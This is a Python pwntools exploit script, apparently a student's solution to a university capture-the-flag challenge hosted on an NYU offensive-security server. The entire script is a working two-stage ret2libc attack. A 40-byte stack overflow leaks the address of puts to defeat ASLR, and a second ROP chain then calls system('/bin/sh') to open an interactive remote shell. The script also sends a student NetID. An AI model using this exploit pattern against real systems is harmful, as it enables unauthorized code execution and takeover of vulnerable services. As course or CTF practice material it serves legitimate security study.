#!/usr/bin/env python3

from pwn import *

#context.log_level = "DEBUG"

# Length of characters needed to reach return address on stack (for overwrite)
OFFSET = 40

# Local process for local testing with gdb attach
'''p = process("./rop.htm")
g = gdb.attach(p, gdbscript="""
	b *(main+40)
	c
	x/40x $rsp
	""",
)'''

# Create connection to challenge server and submit NetID when prompted
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1343)
p.recvuntil(b"something like abc123): ")
p.send(b"aal562\n")

# Receive binary prompt "Can you pop shell? I took away all the useful tools.."
p.recvuntil(b"useful tools..\n")

# Create ELF and ROP insatances to pull useful addresses from libc and the binary
e = ELF("./rop.htm")
r = ROP("./rop.htm")
libc = ELF("libc-2.23.so")

# Build our first payload to leak "puts" from libc
rop_chain_1 = r.rdi.address.to_bytes(8, 'little')		# pop rdi, ret
rop_chain_1 += e.got["puts"].to_bytes(8, 'little')		# GOT address of puts into rdi
rop_chain_1 += e.plt["puts"].to_bytes(8, 'little')		# PLT address of puts to return to
rop_chain_1 += e.symbols["main"].to_bytes(8, 'little')		# return back to main for second payload iteration

# Combine elements and send our first payload	
payload_1 = b"".join(
	[
		b"\x00" * OFFSET,
		rop_chain_1,
		b"\n",
	]
)
p.send(payload_1)

# Assign the leaked address of puts in libc to a variable (leaking addr of puts with puts)
leaked_puts = p.recvline().strip() + b"\x00\x00"
leaked_puts = u64(leaked_puts, endian='little')

# Calculate our libc base
libc.address = leaked_puts - libc.symbols["puts"]

# Find address of /bin/sh in libc
bin_sh_addr = next(libc.search(b"/bin/sh"))

# Find address of system in libc
system_addr = libc.symbols["system"]

# Wait until we return to the gets prompt for the second time
p.recvuntil(b"useful tools..\n")

# Build our second payload to call system with /bin/sh in rdi
rop_chain_2 = r.rdi.address.to_bytes(8, 'little')		# pop rdi, ret
rop_chain_2 += bin_sh_addr.to_bytes(8, 'little')		# address of /bin/sh to pop into rdi
rop_chain_2 += system_addr.to_bytes(8, 'little')		# address of system to return to

# Combine elements and send our first payload
payload_2 = b"".join(
	[
		b"\x00" * OFFSET,
		rop_chain_2,
		b"\n",
	]
)
p.send(payload_2)


# Make interactive to utilize our new shell
p.interactive()
#pause()
